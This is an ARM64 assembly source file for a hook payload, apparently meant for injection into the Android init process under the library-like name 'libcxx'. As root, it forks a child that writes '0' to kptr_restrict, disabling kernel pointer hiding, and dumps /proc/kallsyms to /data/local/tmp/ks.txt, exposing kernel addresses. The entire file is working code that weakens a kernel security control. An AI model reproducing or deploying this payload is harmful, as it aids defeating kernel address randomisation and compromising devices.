.arch armv8-a

    .include "include.inc"

    .global libcxx_start
    .global libcxx_data
    .global libcxx_len
    .global libcxx_first_inst_copy
    .data

libcxx_data:
    dummy_ko_path:
    .skip 64, 0

mutex_file:
    .asciz "/dev/df"
kptr_file:
    .asciz "/proc/sys/kernel/kptr_restrict"
zero_str:
    .asciz "0"
kallsyms_file:
    .asciz "/proc/kallsyms"
dump_file:
    .asciz "/data/local/tmp/ks.txt"
    .balign 8
read_buf:
    .skip 4096, 0
    .balign 4

    .global libcxx_ko_target_off
libcxx_ko_target_off:
    .int dummy_ko_path - libcxx_data

    .align 4

libcxx_start:
    // 现场保护
    stp x0, x1, [sp, #-16]!
    stp x2, x3, [sp, #-16]!
    stp x4, x5, [sp, #-16]!
    stp x6, x7, [sp, #-16]!
    stp x8, x9, [sp, #-16]!
    stp x26, x27, [sp, #-16]!
    stp x28, x29, [sp, #-16]!
    str x30, [sp, #-16]!

    // 1. 检查 uid == 0
    mov     x8, SYS_getuid
    svc     0
    cbnz    w0, return

    // 2. 检查 tid == 1
    mov     x8, SYS_gettid
    svc     0
    cmp     w0, 1
    bne     return

    // 3. 创建互斥锁 /dev/df
    mov     x0, -100
    adr     x1, mutex_file
    movl    x2, (O_CREAT|O_EXCL|O_CLOEXEC)
    mov     x3, xzr
    mov     x8, #SYS_openat
    svc     0

    tbnz    w0, #31, return

    sub     sp, sp, 16

    // 4. clone 子进程
    mov     x8, SYS_gettid
    svc     0
    str     w0, [sp, 8]

    mov     x8, SYS_clone
    add     x4, sp, 8
    mov     x3, xzr
    mov     x2, xzr
    mov     x1, xzr
    movl    x0, (CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD)
    svc     0
    str     w0, [sp, 8]
    add     sp, sp, 16

    cbnz    w0, return          

worker:
    // 5. 尝试修改 kptr_restrict 为 0
    mov     x0, -100
    adr     x1, kptr_file
    movl    x2, (O_WRONLY|O_CLOEXEC)
    mov     x3, xzr
    mov     x8, #SYS_openat
    svc     0
    
    tbnz    w0, #31, open_kallsyms 
    mov     x19, x0
    mov     x0, x19
    adr     x1, zero_str
    mov     x2, #1
    mov     x8, #SYS_write
    svc     0
    mov     x0, x19
    mov     x8, #SYS_close
    svc     0

open_kallsyms:
    // 6. 打开 /proc/kallsyms
    mov     x0, -100
    adr     x1, kallsyms_file
    movl    x2, (O_RDONLY|O_CLOEXEC)
    mov     x3, xzr
    mov     x8, #SYS_openat
    svc     0
    tbnz    w0, #31, cleanup_df
    mov     x20, x0  

    // 7. 打开 /data/local/tmp/ks.txt
    mov     x0, -100
    adr     x1, dump_file
    movl    x2, (O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC)
    movl    x3, 0644
    mov     x8, #SYS_openat
    svc     0
    tbnz    w0, #31, close_kallsyms
    mov     x21, x0  

read_loop:
    // 8. read()
    mov     x0, x20
    adr     x1, read_buf
    movl    x2, 4096
    mov     x8, #SYS_read
    svc     0
    
    cmp     w0, #0
    b.le    close_dump

    // 9. write()
    mov     x22, x0
    mov     x0, x21
    adr     x1, read_buf
    mov     x2, x22
    mov     x8, #SYS_write
    svc     0
    
    b       read_loop

close_dump:
    mov     x0, x21
    mov     x8, #SYS_close
    svc     0

close_kallsyms:
    mov     x0, x20
    mov     x8, #SYS_close
    svc     0

cleanup_df:
    // 10. 无论如何，强制删除 /dev/df
    mov     x0, -100
    adr     x1, mutex_file
    mov     x8, #SYS_unlinkat
    svc     0

myexit:
    mov     x0, #0
    mov     x8, #SYS_exit
    svc     0

return:
    ldr x30, [sp], #16
    ldp x28, x29, [sp], #16
    ldp x26, x27, [sp], #16
    ldp x8, x9, [sp], #16
    ldp x6, x7, [sp], #16
    ldp x4, x5, [sp], #16
    ldp x2, x3, [sp], #16
    ldp x0, x1, [sp], #16
libcxx_first_inst_copy:
    stp     x29, x30, [sp, #-32]!
    b       end
end:

libcxx_end:
libcxx_len:
    .word libcxx_end - libcxx_data
